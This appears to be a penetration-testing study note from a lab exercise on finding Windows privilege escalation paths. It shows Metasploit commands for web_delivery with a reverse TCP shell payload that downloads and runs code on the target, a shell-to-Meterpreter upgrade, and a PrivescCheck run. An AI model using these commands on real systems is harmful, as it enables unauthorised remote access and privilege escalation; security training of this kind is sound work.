# Windows: Identifying Privilege Escalation Vulnerabilities
> The assumption here is that you have gained access to a Windows system, but you do not have elevated privileges (you do not have NT AUTHORITY or SYSTEM). You have gained access as a normal user or via a service account.

## Contents
- [Intro](#intro)
  - [Identifying PrivEsc Vulnerabilities](#identifying-privesc-vulnerabilities)
  - [Script: PrivescCheck](#script-privesccheck)
- [Techniques & Tools](#techniques--tools)
  - [MetaSploit Module: web_delivery](#metasploit-module-web_delivery)
  - [Migrate to Meterpreter](#migrate-to-meterpreter)
  - [Execute PrivescCheck](#execute-privesccheck)

## Intro

### Identifying PrivEsc Vulnerabilities
- In order to elevate your privileges in Windows, you must first identify privilege escalation vulnerabilities on the target system.
- This process will differ greatly based on the type of target you gain access to.
  - Privilege escalation on Windows can be performed through a plethora of techniques based on the version of Windows and the system's unique configuration.
- This process can be quite tedious and time consuming.
  - As a result it is recommended to automate this process of identifying privilege escalation vulnerabilities.
  - This can be done through the use of various automation scripts. One of the best is PrivescCheck...

### Script: PrivescCheck
- [PrivescCheck](https://github.com/itm4n/PrivescCheck): this script aims to enumerate common Windows configuration issues that can be leveraged for local privilege esclation.
  - It also gathers various information that might be useful for exploitation and/or post-exploitation.
- It also gathers various information that might be useful for exploitation and/or post-exploitation.
  - Description: This script aims to identify Local Privilege Escalation (LPE) vulnerabilities that are usually due to Windows configuration issues, or bad practices. It can also gather useful information for some exploitation and post-exploitation tasks.

## Techniques & Tools
> The following is from a lab. It should give you the general contect and process of using the technique with the tools.

### MetaSploit Module: [web_delivery](https://www.offsec.com/metasploit-unleashed/web-delivery/)
> This is a module that creates a server on the attacking machine which hosts a payload. When the victim connects to the attacking server, the payload will be executed on the victim machine.
>
> This module spins up a web server that hosts a payload (based on the target operating system). When you hit run/exploit, it generates some PowerShell code. You copy that PowerShell code and execute it on the target machine. When you run that code on the target, it will download the payload and execute the exploit.
```
> use exploit/multi/script/web_delivery
> show info  # To see what it does
> set target PSH\ (Binary)
> set payload windows/shell/reverse_tcp
> set PSH-EncodedCommand false  # we do not want the ps script encoded
> set LHOST [attack ip or eth#]
> exploit
```
- Copy all the code it spits out.
  - Go to the target system and open a command prompt session (cmd.exe)
  - Right-click in the cmd window and that will paste in your script.
  - Hit ENTER
- Back into your Kali attack machine. You should have a command shell.
- We have access via the user "student."
  - Confirm that with `whoami`
  - Verify the hostname with `hostname`

### Migrate to Meterpreter
- Migrate your command shell you just obtained to a meterpreter session.
```
ctrl + z   # to background the session; still in msfconsole...
> search shell_to
> use post/multi/manage/shell_to_meterpreter
> set LHOST [attack ip]
> set SESSION [meterpreter session #]
> show advanced
  # We need to change the WIN_TRANSFER option
  # Instead of the transfer method being PowerShell, we want VisualBasic (VBS)
> set WIN_TRANSFER VBS
> run/exploit
```
- Go into your meterpreter session. Migrate to a 64-bit process (explorer.exe)
- cd over to the PrivescCheck subdir...
- Open a command shell session in this subdir: `> shell`

### Execute PrivescCheck
- Head over to the [PrivescCheck GitHub repo](https://github.com/itm4n/PrivescCheck) and read how to use it. Copy it.
- You want to copy that entire script and paste it into the shell prompt you just got from meterpreter.
- ENTER to execute it.
- Once it is finished, it will give you a summary at the bottom.
  - Scroll back up to the top and analyze the results...
  - You get a list of the groups on the system
  - As you work through the list, under each is an indicator if there is a vulnerability or not...
